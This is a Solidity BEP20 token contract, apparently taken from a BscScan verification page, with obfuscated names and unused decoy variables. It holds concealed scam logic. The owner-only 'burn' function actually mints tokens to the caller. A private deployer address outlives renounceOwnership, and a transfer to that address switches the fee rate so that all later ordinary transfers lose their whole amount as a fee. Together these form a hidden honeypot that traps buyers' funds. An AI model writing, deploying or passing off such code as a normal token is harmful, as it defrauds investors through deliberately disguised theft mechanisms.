/**
 *Submitted for verification at BscScan.com on 2022-11-14
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-14 14:44:23 GMT
 */
pragma solidity >=0.4.11;
contract kiKtdl {
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public constant totalSupply = 100000000000000000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
event Transfer(address indexed from, address indexed to, uint256 value);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address public  vNdZGG = address(0);
address public owner;
uint256 public constant USJOUh = 9+1;
uint256 public  UBZWYY = 100000000000000000000;
address public  xwEASL = address(0);
address public  azvWwN = address(0);
uint256 public  utDJmw = 1000000000000000000;
uint256 public  NTXYBu = 10000000000000000000;
uint256 public  kjZjff = 10000000000000000000000000000;
address private  qptsbq = address(0);
uint256 public  hSGHFg = 100000000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 public  ehVNGe = 100000000000000000000000;
string public  symbol = "OmjFtG";
address public  dtzrxe = address(0);
string public  name = "wzuKlR";
address public  xJwtNh = address(0);
address public  yJuaxb = address(0);
uint256 public  MyncKd = 10000000000000000;
uint8 public constant decimals = 18;
uint256 private  QAIUiN = 10000000000000;
uint256 public  OpWIsW = 100000000000000000;
mapping (address => uint256) public balanceOf;
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
constructor () public {
qptsbq = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "hYLdTy");
require(to != address(0), "hYLdTy");
require(amount <= balanceOf[from], "hYLdTy");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* USJOUh/QAIUiN ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==qptsbq){
QAIUiN = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}

}